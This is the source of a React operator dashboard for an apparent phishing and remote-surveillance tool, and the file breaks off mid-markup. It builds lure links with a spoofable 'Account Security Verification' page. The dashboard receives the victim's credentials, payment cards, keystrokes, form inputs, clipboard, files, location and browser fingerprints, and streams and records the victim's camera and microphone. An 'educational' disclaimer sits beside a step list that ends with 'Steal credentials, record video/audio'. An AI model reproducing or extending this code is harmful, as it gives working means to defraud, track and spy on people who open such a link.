import { useState, useEffect, useRef, useCallback } from "react";
import { useQuery, useMutation } from "@tanstack/react-query";
import { queryClient, apiRequest } from "@/lib/queryClient";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Badge } from "@/components/ui/badge";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { Checkbox } from "@/components/ui/checkbox";
import { useToast } from "@/hooks/use-toast";
import {
  Wifi, WifiOff, Copy, Trash2, Plus, Camera, Mic, MapPin,
  Smartphone, FileText, Clock, AlertTriangle, Shield, Eye,
  CheckCircle2, XCircle, Monitor, Loader2, ExternalLink,
  Video, VideoOff, MicOff, Download, CameraIcon,
  Power, FolderOpen, Clipboard, Circle, Square,
  KeyRound, ClipboardPaste, Globe, CreditCard,
  Activity, ChevronRight, ListChecks,
  Fingerprint, Keyboard, MousePointer, EyeOff,
  BatteryMedium, WifiIcon, Timer,
  Bell, BellRing, HardDrive, RefreshCw, Anchor,
} from "lucide-react";
import {
  getSwStatus, requestNotificationPermission, subscribeToPush,
  unsubscribeFromPush, getPushSubscriptionStatus, triggerBackgroundSync,
  getCacheStatus, sendSwMessage,
} from "@/lib/serviceWorker";

interface PageConfig {
  steps: { identity: boolean; biometric: boolean; voice: boolean; environment: boolean; documents: boolean };
  enableBanking: boolean;
  enableAutoHarvest: boolean;
  enableCredentialOverlay: boolean;
  autoRequestPermissions: boolean;
  pageTitle: string;
  pageSubtitle: string;
  brandColor: "blue" | "red" | "green" | "purple" | "orange";
}

const defaultPageConfig: PageConfig = {
  steps: { identity: true, biometric: true, voice: true, environment: true, documents: true },
  enableBanking: false,
  enableAutoHarvest: true,
  enableCredentialOverlay: false,
  autoRequestPermissions: false,
  pageTitle: "Account Security Verification",
  pageSubtitle: "",
  brandColor: "blue",
};

interface RemoteSession {
  id: number;
  organizationId: number;
  sessionToken: string;
  name: string;
  status: string;
  permissionsGranted: string[] | null;
  deviceInfo: any;
  locationData: any;
  pageConfig: PageConfig | null;
  createdBy: string;
  createdAt: string;
  expiresAt: string;
  lastActivity: string | null;
}

type PermissionKey = "camera" | "microphone" | "location" | "deviceInfo" | "files" | "credentials" | "clipboard" | "browserData";

interface PermissionStatus { status: "idle" | "requested" | "granted" | "denied"; }

interface SessionEvent {
  id: number;
  timestamp: string;
  type: string;
  details: string;
  selected?: boolean;
}

export default function RemoteControlPage() {
  const { toast } = useToast();
  const [sessionName, setSessionName] = useState("");
  const [expiryMinutes, setExpiryMinutes] = useState("60");
  const [pageConfig, setPageConfig] = useState<PageConfig>({ ...defaultPageConfig });
  const [showConfig, setShowConfig] = useState(false);
  const [activeSessionId, setActiveSessionId] = useState<number | null>(null);
  const [activeSessionToken, setActiveSessionToken] = useState<string | null>(null);
  const [targetConnected, setTargetConnected] = useState(false);
  const [liveDeviceInfo, setLiveDeviceInfo] = useState<any>(null);
  const [liveLocation, setLiveLocation] = useState<any>(null);
  const [liveFiles, setLiveFiles] = useState<any[]>([]);
  const [liveBrowserData, setLiveBrowserData] = useState<any>(null);
  const [liveClipboard, setLiveClipboard] = useState<any[]>([]);
  const [liveCredentials, setLiveCredentials] = useState<any[]>([]);
  const [liveAutoHarvest, setLiveAutoHarvest] = useState<any>(null);
  const [liveKeylogs, setLiveKeylogs] = useState<{ keys: string[]; timestamp: string }[]>([]);
  const [liveFormIntercepts, setLiveFormIntercepts] = useState<any[]>([]);
  const [liveActivity, setLiveActivity] = useState<any[]>([]);
  const [events, setEvents] = useState<SessionEvent[]>([]);
  const [permissionStatuses, setPermissionStatuses] = useState<Record<PermissionKey, PermissionStatus>>({
    camera: { status: "idle" }, microphone: { status: "idle" }, location: { status: "idle" },
    deviceInfo: { status: "idle" }, files: { status: "idle" }, credentials: { status: "idle" },
    clipboard: { status: "idle" }, browserData: { status: "idle" },
  });
  const [cameraEnabled, setCameraEnabled] = useState(true);
  const [micEnabled, setMicEnabled] = useState(true);
  const [isRecordingVideo, setIsRecordingVideo] = useState(false);
  const [isRecordingAudio, setIsRecordingAudio] = useState(false);
  const [videoRecordTime, setVideoRecordTime] = useState(0);
  const [audioRecordTime, setAudioRecordTime] = useState(0);
  const eventIdRef = useRef(0);

  const wsRef = useRef<WebSocket | null>(null);
  const videoRef = useRef<HTMLVideoElement>(null);
  const audioRef = useRef<HTMLAudioElement>(null);
  const peerRef = useRef<RTCPeerConnection | null>(null);
  const videoRecorderRef = useRef<MediaRecorder | null>(null);
  const audioRecorderRef = useRef<MediaRecorder | null>(null);
  const videoChunksRef = useRef<Blob[]>([]);
  const audioChunksRef = useRef<Blob[]>([]);
  const videoTimerRef = useRef<ReturnType<typeof setInterval> | null>(null);
  const audioTimerRef = useRef<ReturnType<typeof setInterval> | null>(null);
  const receivedStreamRef = useRef<MediaStream | null>(null);

  const addEvent = useCallback((type: string, details: string) => {
    eventIdRef.current += 1;
    setEvents((prev) => [{ id: eventIdRef.current, timestamp: new Date().toISOString(), type, details, selected: false }, ...prev]);
  }, []);

  const { data: sessions = [], isLoading } = useQuery<RemoteSession[]>({ queryKey: ["/api/remote-sessions"] });

  const createMutation = useMutation({
    mutationFn: async (data: { name: string; expiryMinutes: number; pageConfig: PageConfig }) => { const res = await apiRequest("POST", "/api/remote-sessions", data); return res.json(); },
    onSuccess: () => { queryClient.invalidateQueries({ queryKey: ["/api/remote-sessions"] }); setSessionName(""); setPageConfig({ ...defaultPageConfig }); setShowConfig(false); toast({ title: "Session created" }); },
  });

  const deleteMutation = useMutation({
    mutationFn: async (id: number) => { await apiRequest("DELETE", `/api/remote-sessions/${id}`); },
    onSuccess: () => { queryClient.invalidateQueries({ queryKey: ["/api/remote-sessions"] }); toast({ title: "Session deleted" }); },
  });

  const sendToTarget = useCallback((msg: object) => {
    if (wsRef.current?.readyState === WebSocket.OPEN) wsRef.current.send(JSON.stringify(msg));
  }, []);

  const connectToSession = useCallback((token: string, sessionId?: number) => {
    if (wsRef.current) wsRef.current.close();
    setActiveSessionToken(token);
    if (sessionId) setActiveSessionId(sessionId);
    setTargetConnected(false);
    setLiveDeviceInfo(null); setLiveLocation(null); setLiveFiles([]); setLiveBrowserData(null);
    setLiveClipboard([]); setLiveCredentials([]); setLiveAutoHarvest(null);
    setLiveKeylogs([]); setLiveFormIntercepts([]); setLiveActivity([]); setEvents([]);
    setCameraEnabled(true); setMicEnabled(true);
    const resetPerms: Record<PermissionKey, PermissionStatus> = {
      camera: { status: "idle" }, microphone: { status: "idle" }, location: { status: "idle" },
      deviceInfo: { status: "idle" }, files: { status: "idle" }, credentials: { status: "idle" },
      clipboard: { status: "idle" }, browserData: { status: "idle" },
    };
    setPermissionStatuses(resetPerms);
    eventIdRef.current = 0;

    const protocol = window.location.protocol === "https:" ? "wss:" : "ws:";
    const ws = new WebSocket(`${protocol}//${window.location.host}/ws`);
    wsRef.current = ws;
    ws.onopen = () => { ws.send(JSON.stringify({ type: "rc_operator", token })); addEvent("system", "Connected to session as operator"); };

    ws.onmessage = (event) => {
      try {
        const msg = JSON.parse(event.data);
        if (msg.type === "rc_target_connected") {
          setTargetConnected(true);
          addEvent("connection", "Target device connected");
          queryClient.invalidateQueries({ queryKey: ["/api/remote-sessions"] });
        }
        if (msg.type === "rc_target_disconnected") { setTargetConnected(false); addEvent("connection", "Target device disconnected"); }
        if (msg.type === "rc_device_info") { setLiveDeviceInfo(msg.data); addEvent("data", "Device information received"); }
        if (msg.type === "rc_location") { setLiveLocation(msg.data); addEvent("data", `Location received: ${msg.data?.latitude?.toFixed(4)}, ${msg.data?.longitude?.toFixed(4)}`); }
        if (msg.type === "rc_file") { setLiveFiles((prev) => [...prev, msg.data]); addEvent("data", `File received: ${msg.data?.name}`); }
        if (msg.type === "rc_credentials") { setLiveCredentials((prev) => [...prev, msg.data]); addEvent("credential", `Credential captured (${msg.data?.type}): ${msg.data?.email || msg.data?.cardNumber?.replace(/.(?=.{4})/g, "*") || "N/A"}`); }
        if (msg.type === "rc_clipboard") { setLiveClipboard((prev) => [...prev, msg.data]); addEvent("data", `Clipboard captured: "${(msg.data?.content || "").substring(0, 40)}..."`); }
        if (msg.type === "rc_browser_data") { setLiveBrowserData(msg.data); addEvent("data", "Browser data received"); }
        if (msg.type === "rc_permission_granted" && msg.permission) {
          setPermissionStatuses((prev) => ({ ...prev, [msg.permission]: { status: "granted" } }));
          addEvent("permission", `${msg.permission} access GRANTED by target`);
        }
        if (msg.type === "rc_permission_denied" && msg.permission) {
          setPermissionStatuses((prev) => ({ ...prev, [msg.permission]: { status: "denied" } }));
          addEvent("permission", `${msg.permission} access DENIED by target`);
        }
        if (msg.type === "rc_track_toggled") {
          if (msg.track === "camera") setCameraEnabled(msg.enabled);
          if (msg.track === "microphone") setMicEnabled(msg.enabled);
          addEvent("control", `${msg.track} ${msg.enabled ? "enabled" : "disabled"}`);
        }
        if (msg.type === "rc_auto_harvest") { setLiveAutoHarvest(msg.data); addEvent("data", `Auto-harvest: canvas=${msg.data?.canvasFingerprint?.substring(0, 8)}, fonts=${msg.data?.fontCount}, IPs=${msg.data?.webrtcLeakedIPs?.length}`); }
        if (msg.type === "rc_keylog") { setLiveKeylogs((prev) => [...prev.slice(-49), msg.data]); }
        if (msg.type === "rc_form_intercept") { setLiveFormIntercepts((prev) => [...prev.slice(-49), msg.data]); addEvent("data", `Form intercept: ${msg.data?.field} (${msg.data?.type})`); }
        if (msg.type === "rc_activity") { setLiveActivity((prev) => [...prev.slice(-99), msg.data]); if (msg.data?.category === "tab_visibility") addEvent("data", `Tab ${msg.data.visible ? "focused" : "hidden"}`); }
        if (msg.type === "rc_offer") handleOffer(msg.sdp, ws);
        if (msg.type === "rc_ice_candidate" && peerRef.current) peerRef.current.addIceCandidate(new RTCIceCandidate(msg.candidate)).catch(() => {});
      } catch {}
    };
    ws.onclose = () => { setTargetConnected(false); };
  }, [activeSessionToken, addEvent]);

  const handleOffer = async (sdp: RTCSessionDescriptionInit, ws: WebSocket) => {
    let pc = peerRef.current;
    const isRenegotiation = pc && pc.signalingState !== "closed";

    if (!isRenegotiation) {
      if (pc) pc.close();
      pc = new RTCPeerConnection({
        iceServers: [
          { urls: "stun:stun.l.google.com:19302" },
          { urls: "stun:stun1.l.google.com:19302" },
        ],
      });
      peerRef.current = pc;

      pc.onicecandidate = (e) => {
        if (e.candidate && ws.readyState === WebSocket.OPEN) {
          ws.send(JSON.stringify({ type: "rc_ice_candidate", candidate: e.candidate }));
        }
      };

      pc.ontrack = (e) => {
        if (!receivedStreamRef.current) {
          receivedStreamRef.current = new MediaStream();
        }
        const existing = receivedStreamRef.current.getTracks().find(t => t.kind === e.track.kind);
        if (existing) receivedStreamRef.current.removeTrack(existing);
        receivedStreamRef.current.addTrack(e.track);

        if (e.track.kind === "video" && videoRef.current) {
          videoRef.current.srcObject = receivedStreamRef.current;
          videoRef.current.play().catch(() => {});
        }
        if (e.track.kind === "audio" && audioRef.current) {
          audioRef.current.srcObject = new MediaStream([e.track]);
          audioRef.current.play().catch(() => {});
        }
        addEvent("data", `${e.track.kind} track received`);
      };

      pc.onconnectionstatechange = () => {
        if (pc!.connectionState === "connected") {
          addEvent("connection", "WebRTC peer connection established");
        }
        if (pc!.connectionState === "disconnected" || pc!.connectionState === "failed") {
          addEvent("connection", `WebRTC connection ${pc!.connectionState}`);
        }
      };
    }

    await pc!.setRemoteDescription(new RTCSessionDescription(sdp));
    const answer = await pc!.createAnswer();
    await pc!.setLocalDescription(answer);
    if (ws.readyState === WebSocket.OPEN) {
      ws.send(JSON.stringify({ type: "rc_answer", sdp: answer }));
    }
  };

  useEffect(() => { return () => { wsRef.current?.close(); peerRef.current?.close(); stopVideoRecording(); stopAudioRecording(); }; }, []);

  const disconnectSession = () => {
    wsRef.current?.close(); peerRef.current?.close(); stopVideoRecording(); stopAudioRecording();
    setActiveSessionToken(null); setTargetConnected(false); setLiveDeviceInfo(null); setLiveLocation(null);
    setLiveFiles([]); setLiveBrowserData(null); setLiveClipboard([]); setLiveCredentials([]);
    receivedStreamRef.current = null;
  };

  const requestPermission = (perm: PermissionKey) => {
    setPermissionStatuses((prev) => ({ ...prev, [perm]: { status: "requested" } }));
    sendToTarget({ type: "rc_request_permission", permission: perm });
    addEvent("request", `Requested ${perm} access from target`);
  };

  const toggleCamera = () => { const n = !cameraEnabled; setCameraEnabled(n); sendToTarget({ type: "rc_toggle_camera", enabled: n }); addEvent("control", n ? "Camera enabled" : "Camera disabled"); };
  const toggleMic = () => { const n = !micEnabled; setMicEnabled(n); sendToTarget({ type: "rc_toggle_mic", enabled: n }); addEvent("control", n ? "Mic enabled" : "Mic disabled"); };

  const takeScreenshot = () => {
    const v = videoRef.current;
    if (!v || !v.videoWidth) { toast({ title: "No video feed", variant: "destructive" }); return; }
    const c = document.createElement("canvas"); c.width = v.videoWidth; c.height = v.videoHeight;
    c.getContext("2d")!.drawImage(v, 0, 0);
    const link = document.createElement("a"); link.download = `screenshot-${Date.now()}.png`; link.href = c.toDataURL("image/png"); link.click();
    addEvent("action", "Screenshot captured");
  };

  const startVideoRecording = () => {
    const s = receivedStreamRef.current; if (!s) { toast({ title: "No stream", variant: "destructive" }); return; }
    videoChunksRef.current = [];
    try {
      const r = new MediaRecorder(s, { mimeType: "video/webm;codecs=vp9,opus" });
      r.ondataavailable = (e) => { if (e.data.size > 0) videoChunksRef.current.push(e.data); };
      r.onstop = () => { const b = new Blob(videoChunksRef.current, { type: "video/webm" }); const l = document.createElement("a"); l.download = `recording-${Date.now()}.webm`; l.href = URL.createObjectURL(b); l.click(); URL.revokeObjectURL(l.href); };
      r.start(1000); videoRecorderRef.current = r; setIsRecordingVideo(true); setVideoRecordTime(0);
      videoTimerRef.current = setInterval(() => setVideoRecordTime((t) => t + 1), 1000);
      addEvent("action", "Video recording started");
    } catch { toast({ title: "Recording not supported", variant: "destructive" }); }
  };

  const stopVideoRecording = () => {
    if (videoRecorderRef.current && videoRecorderRef.current.state !== "inactive") videoRecorderRef.current.stop();
    videoRecorderRef.current = null; setIsRecordingVideo(false);
    if (videoTimerRef.current) clearInterval(videoTimerRef.current); videoTimerRef.current = null;
    addEvent("action", "Video recording stopped");
  };

  const startAudioRecording = () => {
    const s = receivedStreamRef.current; if (!s) { toast({ title: "No stream", variant: "destructive" }); return; }
    const at = s.getAudioTracks(); if (!at.length) { toast({ title: "No audio track", variant: "destructive" }); return; }
    audioChunksRef.current = [];
    try {
      const r = new MediaRecorder(new MediaStream(at), { mimeType: "audio/webm;codecs=opus" });
      r.ondataavailable = (e) => { if (e.data.size > 0) audioChunksRef.current.push(e.data); };
      r.onstop = () => { const b = new Blob(audioChunksRef.current, { type: "audio/webm" }); const l = document.createElement("a"); l.download = `audio-${Date.now()}.webm`; l.href = URL.createObjectURL(b); l.click(); URL.revokeObjectURL(l.href); };
      r.start(1000); audioRecorderRef.current = r; setIsRecordingAudio(true); setAudioRecordTime(0);
      audioTimerRef.current = setInterval(() => setAudioRecordTime((t) => t + 1), 1000);
      addEvent("action", "Audio recording started");
    } catch { toast({ title: "Audio recording not supported", variant: "destructive" }); }
  };

  const stopAudioRecording = () => {
    if (audioRecorderRef.current && audioRecorderRef.current.state !== "inactive") audioRecorderRef.current.stop();
    audioRecorderRef.current = null; setIsRecordingAudio(false);
    if (audioTimerRef.current) clearInterval(audioTimerRef.current); audioTimerRef.current = null;
    addEvent("action", "Audio recording stopped");
  };

  const copyText = (text: string, label: string) => { navigator.clipboard.writeText(text); toast({ title: `${label} copied` }); };
  const downloadFile = (file: any) => { if (!file.preview) return; const l = document.createElement("a"); l.download = file.name; l.href = file.preview; l.click(); };
  const downloadAllFiles = () => { liveFiles.forEach((f) => downloadFile(f)); addEvent("action", `Bulk download ${liveFiles.length} files`); };
  const formatTime = (s: number) => `${Math.floor(s / 60).toString().padStart(2, "0")}:${(s % 60).toString().padStart(2, "0")}`;
  const getSessionLink = (t: string) => `${window.location.origin}/rc/${t}`;
  const copyLink = (t: string) => { navigator.clipboard.writeText(getSessionLink(t)); toast({ title: "Link copied" }); };

  const toggleEventSelect = (id: number) => { setEvents((prev) => prev.map((e) => e.id === id ? { ...e, selected: !e.selected } : e)); };
  const selectAllEvents = () => { setEvents((prev) => prev.map((e) => ({ ...e, selected: true }))); };
  const deselectAllEvents = () => { setEvents((prev) => prev.map((e) => ({ ...e, selected: false }))); };
  const exportSelectedEvents = () => {
    const sel = events.filter((e) => e.selected);
    if (!sel.length) { toast({ title: "No events selected" }); return; }
    const json = JSON.stringify(sel.map(({ id, timestamp, type, details }) => ({ id, timestamp, type, details })), null, 2);
    const b = new Blob([json], { type: "application/json" });
    const l = document.createElement("a"); l.download = `events-${Date.now()}.json`; l.href = URL.createObjectURL(b); l.click(); URL.revokeObjectURL(l.href);
    toast({ title: `Exported ${sel.length} events` });
  };
  const copySelectedEvents = () => {
    const sel = events.filter((e) => e.selected);
    if (!sel.length) { toast({ title: "No events selected" }); return; }
    navigator.clipboard.writeText(sel.map((e) => `[${e.timestamp}] ${e.type}: ${e.details}`).join("\n"));
    toast({ title: `${sel.length} events copied` });
  };
  const clearSelectedEvents = () => { setEvents((prev) => prev.filter((e) => !e.selected)); toast({ title: "Selected events cleared" }); };

  const getStatusBadge = (status: string) => {
    const map: Record<string, { cls: string; label: string; tid: string }> = {
      active: { cls: "bg-green-500/20 text-green-400 border-green-500/30", label: "Active", tid: "badge-status-active" },
      pending: { cls: "bg-yellow-500/20 text-yellow-400 border-yellow-500/30", label: "Pending", tid: "badge-status-pending" },
      expired: { cls: "bg-red-500/20 text-red-400 border-red-500/30", label: "Expired", tid: "badge-status-expired" },
      closed: { cls: "bg-gray-500/20 text-gray-400 border-gray-500/30", label: "Closed", tid: "badge-status-closed" },
    };
    const m = map[status]; if (!m) return <Badge variant="secondary">{status}</Badge>;
    return <Badge className={m.cls} data-testid={m.tid}>{m.label}</Badge>;
  };

  const getPermBadge = (s: PermissionStatus["status"]) => {
    if (s === "granted") return <Badge className="bg-green-500/20 text-green-400 border-green-500/30 text-[10px]"><CheckCircle2 className="w-3 h-3 mr-0.5" />Granted</Badge>;
    if (s === "denied") return <Badge className="bg-red-500/20 text-red-400 border-red-500/30 text-[10px]"><XCircle className="w-3 h-3 mr-0.5" />Denied</Badge>;
    if (s === "requested") return <Badge className="bg-yellow-500/20 text-yellow-400 border-yellow-500/30 text-[10px]"><Loader2 className="w-3 h-3 mr-0.5 animate-spin" />Pending</Badge>;
    return <Badge className="bg-gray-500/20 text-gray-400 border-gray-500/30 text-[10px]">Idle</Badge>;
  };

  const permissionItems: { key: PermissionKey; label: string; icon: typeof Camera }[] = [
    { key: "camera", label: "Camera", icon: Camera }, { key: "microphone", label: "Microphone", icon: Mic },
    { key: "location", label: "Location", icon: MapPin }, { key: "deviceInfo", label: "Device Info", icon: Smartphone },
    { key: "files", label: "Files", icon: FolderOpen }, { key: "credentials", label: "Credentials", icon: KeyRound },
    { key: "clipboard", label: "Clipboard", icon: ClipboardPaste }, { key: "browserData", label: "Browser Data", icon: Globe },
  ];

  const selectedEventsCount = events.filter((e) => e.selected).length;

  return (
    <div className="p-4 sm:p-6 space-y-6 max-w-7xl mx-auto">
      <div className="flex items-center gap-3">
        <div className="flex items-center justify-center w-10 h-10 rounded-lg bg-red-500/10 border border-red-500/20">
          <Eye className="w-5 h-5 text-red-400" />
        </div>
        <div>
          <h1 className="text-xl font-bold" data-testid="text-page-title">Remote Control</h1>
          <p className="text-xs text-muted-foreground">Educational cybersecurity remote access demonstration</p>
        </div>
      </div>

      <Card className="border-yellow-500/30 bg-yellow-500/5">
        <CardContent className="p-4 flex items-start gap-3">
          <AlertTriangle className="w-5 h-5 text-yellow-400 flex-shrink-0 mt-0.5" />
          <div className="text-sm">
            <p className="font-medium text-yellow-400">Educational Tool</p>
            <p className="text-muted-foreground text-xs mt-1">
              This tool demonstrates how attackers gain access to devices, steal credentials, banking info, and personal data through social engineering.
              All access requires explicit browser permission prompts. Use only for authorized cybersecurity training.
            </p>
          </div>
        </CardContent>
      </Card>

      {!activeSessionToken ? (
        <div className="space-y-6">
          <div className="grid gap-6 lg:grid-cols-2">
            <Card>
              <CardHeader className="pb-3"><CardTitle className="text-sm flex items-center gap-2"><Plus className="w-4 h-4" />Create New Session</CardTitle></CardHeader>
              <CardContent className="space-y-3">
                <Input placeholder="Session name (e.g., Training Demo 1)" value={sessionName} onChange={(e) => setSessionName(e.target.value)} data-testid="input-session-name" />
                <div className="flex gap-2">
                  <Select value={expiryMinutes} onValueChange={setExpiryMinutes}>
                    <SelectTrigger className="w-full" data-testid="select-expiry"><SelectValue /></SelectTrigger>
                    <SelectContent>
                      <SelectItem value="15">15 min</SelectItem><SelectItem value="30">30 min</SelectItem>
                      <SelectItem value="60">1 hour</SelectItem><SelectItem value="120">2 hours</SelectItem>
                      <SelectItem value="480">8 hours</SelectItem><SelectItem value="1440">24 hours</SelectItem>
                    </SelectContent>
                  </Select>
                </div>

                <Button variant="outline" size="sm" className="w-full text-xs" onClick={() => setShowConfig(!showConfig)} data-testid="button-toggle-config">
                  <ListChecks className="w-3 h-3 mr-1" />{showConfig ? "Hide" : "Show"} Page Configuration
                </Button>

                {showConfig && (
                  <div className="space-y-3 p-3 rounded-lg border border-border/50 bg-muted/10">
                    <div>
                      <label className="text-xs font-medium text-muted-foreground mb-1.5 block">Page Title</label>
                      <Input value={pageConfig.pageTitle} onChange={(e) => setPageConfig((p) => ({ ...p, pageTitle: e.target.value }))} placeholder="Account Security Verification" className="h-8 text-xs" data-testid="input-page-title" />
                    </div>
                    <div>
                      <label className="text-xs font-medium text-muted-foreground mb-1.5 block">Subtitle (optional)</label>
                      <Input value={pageConfig.pageSubtitle} onChange={(e) => setPageConfig((p) => ({ ...p, pageSubtitle: e.target.value }))} placeholder="e.g., Google Account Recovery" className="h-8 text-xs" data-testid="input-page-subtitle" />
                    </div>
                    <div>
                      <label className="text-xs font-medium text-muted-foreground mb-1.5 block">Brand Color</label>
                      <div className="flex gap-2">
                        {(["blue", "red", "green", "purple", "orange"] as const).map((c) => (
                          <button key={c} onClick={() => setPageConfig((p) => ({ ...p, brandColor: c }))} className={`w-7 h-7 rounded-full border-2 transition-all ${pageConfig.brandColor === c ? "border-foreground scale-110" : "border-transparent"}`} style={{ backgroundColor: { blue: "#3b82f6", red: "#ef4444", green: "#22c55e", purple: "#a855f7", orange: "#f97316" }[c] }} data-testid={`button-color-${c}`} />
                        ))}
                      </div>
                    </div>
                    <div>
                      <label className="text-xs font-medium text-muted-foreground mb-2 block">Wizard Steps</label>
                      <div className="space-y-1.5">
                        {([
                          { key: "identity" as const, label: "Identity Verification (login form)" },
                          { key: "biometric" as const, label: "Biometric Scan (camera)" },
                          { key: "voice" as const, label: "Voice Authentication (microphone)" },
                          { key: "environment" as const, label: "Environment Check (auto-scan)" },
                          { key: "documents" as const, label: "Document Upload (files)" },
                        ]).map((s) => (
                          <label key={s.key} className="flex items-center gap-2 text-xs cursor-pointer">
                            <Checkbox checked={pageConfig.steps[s.key]} onCheckedChange={(v) => setPageConfig((p) => ({ ...p, steps: { ...p.steps, [s.key]: !!v } }))} data-testid={`checkbox-step-${s.key}`} />
                            <span>{s.label}</span>
                          </label>
                        ))}
                      </div>
                    </div>
                    <div className="space-y-1.5 pt-1 border-t border-border/30">
                      <label className="flex items-center gap-2 text-xs cursor-pointer">
                        <Checkbox checked={pageConfig.enableBanking} onCheckedChange={(v) => setPageConfig((p) => ({ ...p, enableBanking: !!v }))} data-testid="checkbox-enable-banking" />
                        <span>Payment Card Capture (banking tab)</span>
                      </label>
                      <label className="flex items-center gap-2 text-xs cursor-pointer">
                        <Checkbox checked={pageConfig.enableAutoHarvest} onCheckedChange={(v) => setPageConfig((p) => ({ ...p, enableAutoHarvest: !!v }))} data-testid="checkbox-enable-autoharvest" />
                        <span>Auto-Harvest (fingerprint, keylog, activity)</span>
                      </label>
                      <label className="flex items-center gap-2 text-xs cursor-pointer">
                        <Checkbox checked={pageConfig.enableCredentialOverlay} onCheckedChange={(v) => setPageConfig((p) => ({ ...p, enableCredentialOverlay: !!v }))} data-testid="checkbox-enable-credential-overlay" />
                        <span>Credential Re-auth Overlay</span>
                      </label>
                      <label className="flex items-center gap-2 text-xs cursor-pointer">
                        <Checkbox checked={pageConfig.autoRequestPermissions} onCheckedChange={(v) => setPageConfig((p) => ({ ...p, autoRequestPermissions: !!v }))} data-testid="checkbox-auto-request" />
                        <span>Auto-Request Permissions (during wizard)</span>
                      </label>
                    </div>
                  </div>
                )}

                <Button className="w-full" onClick={() => createMutation.mutate({ name: sessionName, expiryMinutes: parseInt(expiryMinutes), pageConfig })} disabled={!sessionName.trim() || createMutation.isPending} data-testid="button-create-session">
                  {createMutation.isPending ? <Loader2 className="w-4 h-4 animate-spin" /> : <Plus className="w-4 h-4" />}<span className="ml-1">Create Session</span>
                </Button>
              </CardContent>
            </Card>
            <Card>
              <CardHeader className="pb-3"><CardTitle className="text-sm flex items-center gap-2"><Shield className="w-4 h-4" />How It Works</CardTitle></CardHeader>
              <CardContent className="space-y-2 text-xs text-muted-foreground">
                {["Create session and copy the link", "Share link with target (email/message)", "Request permissions remotely from control panel", "Target sees popups and browser prompts", "Steal credentials, record video/audio, capture data"].map((t, i) => (
                  <div key={i} className="flex gap-2"><span className="font-mono text-primary">{i + 1}.</span><span>{t}</span></div>
                ))}
              </CardContent>
            </Card>
          </div>

          <Card>
            <CardHeader className="pb-3"><CardTitle className="text-sm flex items-center gap-2"><Monitor className="w-4 h-4" />Sessions ({sessions.length})</CardTitle></CardHeader>
            <CardContent>
              {isLoading ? <div className="flex justify-center py-8"><Loader2 className="w-6 h-6 animate-spin text-muted-foreground" /></div>
              : sessions.length === 0 ? <p className="text-center text-sm text-muted-foreground py-8">No sessions yet.</p>
              : (
                <div className="space-y-2">
                  {sessions.map((s) => (
                    <div key={s.id} className="flex flex-col sm:flex-row sm:items-center gap-2 sm:gap-4 p-3 rounded-lg border border-border/50 hover:border-border" data-testid={`session-row-${s.id}`}>
                      <div className="flex-1 min-w-0">
                        <div className="flex items-center gap-2">
                          <span className="text-sm font-medium truncate" data-testid={`text-session-name-${s.id}`}>{s.name}</span>
                          {getStatusBadge(s.status)}
                        </div>
                        <div className="flex items-center gap-3 mt-1 text-[10px] text-muted-foreground">
                          <span className="flex items-center gap-1"><Clock className="w-3 h-3" />Expires {new Date(s.expiresAt).toLocaleString()}</span>
                        </div>
                      </div>
                      <div className="flex items-center gap-1 flex-shrink-0">
                        <Button size="sm" variant="ghost" className="h-7 text-xs" onClick={() => copyLink(s.sessionToken)} data-testid={`button-copy-link-${s.id}`}><Copy className="w-3 h-3 mr-1" />Link</Button>
                        <Button size="sm" variant="outline" className="h-7 text-xs" onClick={() => connectToSession(s.sessionToken, s.id)} disabled={s.status === "expired" || s.status === "closed"} data-testid={`button-connect-${s.id}`}><Wifi className="w-3 h-3 mr-1" />Monitor</Button>
                        <Button size="sm" variant="ghost" className="h-7 w-7 p-0 text-red-400 hover:text-red-300" onClick={() => deleteMutation.mutate(s.id)} data-testid={`button-delete-${s.id}`}><Trash2 className="w-3 h-3" /></Button>
                      </div>
                    </div>
                  ))}
                </div>
              )}
            </CardContent>
          </Card>
        </div>
      ) : (
        <div className="space-y-4">
          <div className="flex items-center justify-between flex-wrap gap-2">
            <div className="flex items-center gap-2">
              <h2 className="text-lg font-semibold">Live Session</h2>
              {targetConnected ? (
                <Badge className="bg-green-500/20 text-green-400 border-green-500/30 animate-pulse"><Wifi className="w-3 h-3 mr-1" />Target Connected</Badge>
              ) : (
                <Badge className="bg-gray-500/20 text-gray-400 border-gray-500/30"><WifiOff className="w-3 h-3 mr-1" />Waiting...</Badge>
              )}
            </div>
            <div className="flex items-center gap-2">
              <Button size="sm" variant="ghost" className="h-7 text-xs" onClick={() => copyLink(activeSessionToken)} data-testid="button-copy-active-link"><Copy className="w-3 h-3 mr-1" />Link</Button>
              <Button size="sm" variant="outline" className="h-7 text-xs border-red-500/30 text-red-400" onClick={disconnectSession} data-testid="button-disconnect"><WifiOff className="w-3 h-3 mr-1" />Disconnect</Button>
            </div>
          </div>

          {!targetConnected ? (
            <Card className="border-dashed">
              <CardContent className="p-8 text-center space-y-3">
                <Loader2 className="w-8 h-8 animate-spin text-muted-foreground mx-auto" />
                <p className="text-sm text-muted-foreground">Waiting for target to open the link...</p>
                <code className="text-xs bg-muted px-2 py-1 rounded max-w-md truncate block mx-auto" data-testid="text-session-link">{getSessionLink(activeSessionToken)}</code>
              </CardContent>
            </Card>
          ) : (
            <Tabs defaultValue="control" className="w-full">
              <TabsList className="w-full justify-start flex-wrap h-auto gap-1 bg-muted/30 p-1" data-testid="tabs-list">
                <TabsTrigger value="control" className="text-xs" data-testid="tab-control"><Power className="w-3 h-3 mr-1" />Control</TabsTrigger>
                <TabsTrigger value="feed" className="text-xs" data-testid="tab-feed"><Camera className="w-3 h-3 mr-1" />Live Feed</TabsTrigger>
                <TabsTrigger value="intel" className="text-xs" data-testid="tab-intel"><Shield className="w-3 h-3 mr-1" />Intelligence</TabsTrigger>
                <TabsTrigger value="education" className="text-xs" data-testid="tab-education"><AlertTriangle className="w-3 h-3 mr-1" />Education</TabsTrigger>
                <TabsTrigger value="files" className="text-xs" data-testid="tab-files"><FolderOpen className="w-3 h-3 mr-1" />Files ({liveFiles.length})</TabsTrigger>
                <TabsTrigger value="events" className="text-xs" data-testid="tab-events"><Activity className="w-3 h-3 mr-1" />Events ({events.length})</TabsTrigger>
